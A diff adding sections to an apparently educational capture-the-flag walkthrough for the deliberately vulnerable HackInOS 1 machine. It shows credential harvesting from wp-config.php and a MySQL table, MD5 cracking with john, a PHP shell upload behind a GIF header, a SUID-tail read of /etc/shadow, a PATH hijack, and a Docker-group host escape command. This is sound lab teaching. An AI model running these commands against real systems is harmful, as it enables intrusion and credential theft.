@@ -14,6 +14,9 @@
 | **Target OS** | Ubuntu — Apache/PHP web app **on port 8000**, running **inside a Docker container**; the host runs OpenSSH |
 | **Author's note** | *"**localhost is meant to be there!**"* |
 
+> ?? **Learning Path 1 ? Machine 13 of 13 ([Course Overview](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/README.md) ? [????????? ???????? 1](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/README.md))**  
+> **Study the Lesson Card first** (theory, pre-lab questions, 5-rung hints ladder): **[English Card](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/13-hackinos-1.md)** ? **[???????? ?????](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/%CE%9C%CE%B7%CF%87%CE%B1%CE%BD%CE%AD%CF%82/13-hackinos-1.md)** ? Previous in path: [Machine 12 ? symfonos: 1](../3-062-symfonos-1/README.md)
+
 > **Read that note before you start.** The application's own links point at
 > `localhost`, which is the single biggest source of confusion on this box. The fix is
 > one line in `/etc/hosts` — see [§ 2.2](#22-the-etchosts-trick-the-authors-note-explained).
@@ -1287,6 +1290,53 @@ Nice try! This is a container. Get to the host.
 
 ![Root inside the container, and the fake flag](images/05-container-root.png)
 
+### 4.5 The verified database pivot (`/root/.port` → `wp-config.php` → MySQL `db` → `host_ssh_cred`)
+
+> ⚠️ **Verification note:** In published community writeups (Hacking Articles, Jon Wood, iProg, Ethical Hackers Club), `/etc/shadow` inside the web container holds **only** `root`'s hash (`john`), while the host SSH password for `hummingbirdscyber` (`123456`) is stored as an unsalted MD5 hash inside the sibling MySQL container `db`. Always inspect both `/root/` and `/var/www/html/wp-config.php` before leaving the container.
+
+Check for hidden files in `/root/` and read the WordPress database configuration:
+
+```bash
+ls -la /root/
+cat /root/.port
+grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST" /var/www/html/wp-config.php
+```
+
+```text
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wordpress' );
+define( 'DB_PASSWORD', 'wordpress' );
+define( 'DB_HOST', 'db:3306' );
+```
+
+Query the internal Docker database host `db` using the recovered credentials:
+
+```bash
+mysql -h db -u wordpress -pwordpress -D wordpress -e "SHOW TABLES; SELECT * FROM host_ssh_cred;"
+```
+
+```text
++-----------------------+
+| Tables_in_wordpress   |
++-----------------------+
+| host_ssh_cred         |
+| wp_commentmeta        |
+...
++-------------------+----------------------------------+
+| id                | password                         |
++-------------------+----------------------------------+
+| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |
++-------------------+----------------------------------+
+```
+
+Crack the 32-hex unsalted MD5 hash on Kali:
+
+```bash
+echo 'hummingbirdscyber:e10adc3949ba59abbe56e057f20f883e' > db_hash.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt db_hash.txt
+# -> 123456 (hummingbirdscyber)
+```
+
 ---
 
 ## 5. Escaping to the host
@@ -1703,6 +1753,18 @@ bin  boot  dev  etc  home  initrd.img  lib  ...  root  ...
   - [HackTricks — Bypassing image upload restrictions](https://book.hacktricks.xyz/pentesting-web/file-upload)
   - [HackTricks — Container escape / Docker breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
   - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+
+### Community notes — consensus, pitfalls and alternative routes (cross-checked against the sources below):
+
+- **Consensus chain:** `nmap -p-` → `22` + `8000` (no 80; WordPress front page rendering broken) → `/etc/hosts hackinos` or Burp Match & Replace (base URL hard-coded to `localhost:8000`) → `robots.txt` → `/upload.php` (`/uploads` → 403, no indexing) → read `upload.php` from the dev's GitHub (`fatihhcelik/Vulnerable-Machine---Hint`) → upload `GIF87a`/`GIF89a`+PHP → `ffuf`/`wfuzz`/`dirb` the 100 candidates → www-data shell → `/.dockerenv` + `/proc/1/cgroup` = container → SUID `/usr/bin/tail` → `/etc/shadow` → `root:john` → `su root` (container, fake flag, `/root/.port` hint) → `wp-config.php` creds `wordpress:wordpress`, host `db` → MySQL → table `host_ssh_cred` → unsalted MD5 `e10adc3949ba59abbe56e057f20f883e` → `john --format=raw-md5` → `hummingbirdscyber:123456` → `ssh hummingbirdscyber@TARGET` → `999(docker)` → `docker run -v /:/host --rm -it alpine chroot /host sh` → host `/root/flag`.
+- **Common pitfall:** never add `TARGET localhost` — `127.0.0.1 localhost` already exists; give another hostname and drive the POST with curl/Burp, because from the browser the form posts to your own machine. (A commenter on Jon Wood's writeup who repointed `localhost` itself kept hitting `getimagesize(): Filename cannot be empty` — evidence of how much of the app assumes it.)
+- **Common pitfall:** the MIME check is live and magic-byte-only, so a real image header (`GIF87a`/`GIF89a`) is required; the filename is `md5(<name>.<rand>)` with the extension lower-cased **inside** the hash. Test a `.txt` upload too — the `:)` rejection proves the check exists.
+- **Common pitfall:** container root is not the goal — `su root` gives a fake flag (`Life consists of details..` in several writeups); you must pivot (`.port` → `wp-config.php` → MySQL) and then to SSH on port 22 as `hummingbirdscyber` for the `999(docker)` group.
+- **⚠️ Verification note:** the SUID-`tail` read of `/etc/shadow` yields only the **root** (`john`) hash; `hummingbirdscyber:123456` comes from the **web app's database** (a plain MD5 in `host_ssh_cred`), not from `/etc/shadow`.
+- **⚠️ Verification note:** writeups disagree on the shadow hash **format** — one screenshot shows `$6$` (SHA-512-crypt), other writeups mention the weaker `$1$` (MD5-crypt). John auto-detects either; do not force `--format` on that hash. The cracked value (`root:john`) is consensus. Likewise the DB container's IP varies by revision (`172.18.0.2` or `172.18.0.3`) — trust the Docker DNS name `db`.
+- **Alternative routes:** an SUID-root helper `a.out` in the user's home calls `whoami` by bare name with `/home/hummingbirdscyber/bin` first in `$PATH` → PATH hijack → SUID bash (`-p`!); for the escape `docker run --rm -v /home/$USER:/h_docs ubuntu sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh'` also works; and Hacking Articles pivots **from the www-data shell** with Metasploit (`web_delivery` → `autoroute` → `ping_sweep`/`portscan` over `172.18.0.0/16`) to find the MySQL container without ever taking the `su root` detour.
+- **Verified sources:** [Hacking Articles](https://www.hackingarticles.in/hackinos1-vulnhub-lab-walkthrough/) · [Jon Wood](https://windsorwebdeveloper.com/hackinos-1-vulnhub-walkthrough/) · [iProg](https://www.iprog.it/blog/sicurezza-informatica/hackinos-1-walkthrough/) · [Ethical Hackers Club](https://ethicalhackers.club/hackinos-level-1-vulnhub-complete-walkthrough-guide)
 
 ---
 
